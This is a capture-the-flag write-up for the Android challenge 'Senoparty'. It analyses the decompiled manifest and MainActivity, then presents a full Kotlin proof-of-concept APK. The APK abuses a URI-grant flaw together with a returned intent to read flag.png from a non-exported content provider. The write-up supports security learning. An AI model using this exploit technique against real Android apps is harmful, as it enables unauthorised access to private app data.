---
date: '2025-06-30T16:25:25+08:00'
title: 'ICSCTF Senoparty'
tags:
    - Android CTF
    - ICSCTF
---

## Description

> I asked for the challenge from other people so I have no idea what the description is. All I know is this challenge required me to upload my malicious APK into the server
> [Senoparty.apk](static/Senoparty.apk)

## Static Analysis

I started out using `jadx-gui` to decompile and read the code. 

```xml
<activity
    android:theme="@style/Theme.Senoparty"
    android:label="@string/app_name"
    android:name="com.example.senoparty.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <data android:scheme="content"/>
        <data android:scheme="file"/>
    </intent-filter>
</activity>
<provider
    android:name="com.example.senoparty.SenopartyProvider"
    android:exported="false"
    android:authorities="com.example.senoparty.SenopartyProvider"
    android:grantUriPermissions="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</provider>
```

Based on the `AndroidManifest.xml`, there's a `MainActivity` activity and a `SenopartyProvider` provider. I then first looked into the `MainActivity`.

```java
@Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    EdgeToEdge.enable$default(this, null, null, 3, null);
    handleIt();
    ComponentActivityKt.setContent$default(this, null, ComposableSingletons$MainActivityKt.INSTANCE.m7104getLambda1$app_debug(), 1, null);
}

private final void handleIt() {
    try {
        new URI(getIntent().getStringExtra("android.intent.extra.STREAM"));
        Log.e("message", "Well What");
        setResult(-1);
        finish();
    } catch (NullPointerException e) {
        setResult(0);
    } catch (URISyntaxException e2) {
        setResult(0, getIntent());
        finish();
    }
}
```

Based on the code, It will get intent on `android.intent.extra.STREAM` and passed it into URI. If there's an error, it will pass to the `setResult(0, getIntent())` code. Since this is what I want, I will need to pass a string that has will cause the error.

Back to the provider, it has this code `android:grantUriPermissions="true"` which is something vulnerable. Combining with the `setResult(0, getIntent())`, it is possible to leak data by creating a malicious APK.

## Dynamic Analysis

Here's the part where I create a malicious APK to interact with it. I will write the code in Kotlin.

```kotlin
val bitmapState = remember { mutableStateOf<Bitmap?>(null) }


val startForResult = rememberLauncherForActivityResult(
    contract = ActivityResultContracts.StartActivityForResult()
) { result: ActivityResult ->
    // Handle result if needed
    Log.d("IntentDump", "Received result ${result}")
    Log.d("IntentDump",result.data?.data.toString())
    val uri = result.data?.data
    val bitmap = uri?.let {
        contentResolver.openInputStream(it)?.use { input ->
            BitmapFactory.decodeStream(input)
        }
    }
    bitmapState.value = bitmap
}

LaunchedEffect(Unit) {
    val intent = Intent().apply {
        setClassName(
            "com.example.senoparty",
            "com.example.senoparty.MainActivity"
        )
        setData(Uri.parse("content://com.example.senoparty.SenopartyProvider/flag.png"))
        putExtra(Intent.EXTRA_STREAM, ":/trigger-error")
        setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)

    }
    startForResult.launch(intent)
}


bitmapState.value?.let{
    Image(BitmapPainter(it.asImageBitmap()),"test",modifier = Modifier.padding(innerPadding))
}
```

There are 3 main part of the Kotlin code. 

The first one is related to the `intent` where it will send one intent into the `Senoparty.apk`. This is to trigger the `MainActivity` and the intent consist of several additional information. One of it is the `putExtra(Intent.EXTRA_STREAM,":/trigger-error")` where it is used to trigger URI error to ensure that the code reach the `setResult(0,getIntent())`. The `setData` and `setFlags` is for receiving data from the `Senoparty.apk` provider.

The second part is related to `startForResult.launch` where it actually receives the information after the intent is send out and there's information sending back. If there's information, it will try to extract the data. 

The third part is related to `Image` because the received data is an image, it will required the `Image` function to be view the image.

Since I do not have the real `flag.png` with me, I just randomly add a `flag.png` and try it locally.

![alt text](img/index.png#center)

here's a simple outcome of how the images is retrieved.

### Full POC code

```kotlin
package io.ks.testingpoc

import android.app.Activity
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.painter.BitmapPainter
import androidx.compose.ui.tooling.preview.Preview
import io.ks.testingpoc.ui.theme.TestingPocTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            TestingPocTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Text(
                        text = "Android",
                        modifier = Modifier.padding(innerPadding)
                    )
                    val bitmapState = remember { mutableStateOf<Bitmap?>(null) }


                    val startForResult = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.StartActivityForResult()
                    ) { result: ActivityResult ->
                        // Handle result if needed
                        Log.d("IntentDump", "Received result ${result}")
                        Log.d("IntentDump",result.data?.data.toString())
                        val uri = result.data?.data
                        val bitmap = uri?.let {
                            contentResolver.openInputStream(it)?.use { input ->
                                BitmapFactory.decodeStream(input)
                            }
                        }
                        bitmapState.value = bitmap
                    }

                    LaunchedEffect(Unit) {
                        val intent = Intent().apply {
                            setClassName(
                                "com.example.senoparty",
                                "com.example.senoparty.MainActivity"
                            )
                            setData(Uri.parse("content://com.example.senoparty.SenopartyProvider/flag.png"))
                            putExtra(Intent.EXTRA_STREAM, ":/trigger-error")
                            setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)

                        }
                        startForResult.launch(intent)
                    }


                    bitmapState.value?.let{
                        Image(BitmapPainter(it.asImageBitmap()),"test",modifier = Modifier.padding(innerPadding))
                    }


                }
            }
        }
    }
}

```

## Things I learned from this challenge

- `android:grantUriPermissions="true"` is vulnerable, read [https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/) for more information
- writing my own POC APK in kotlin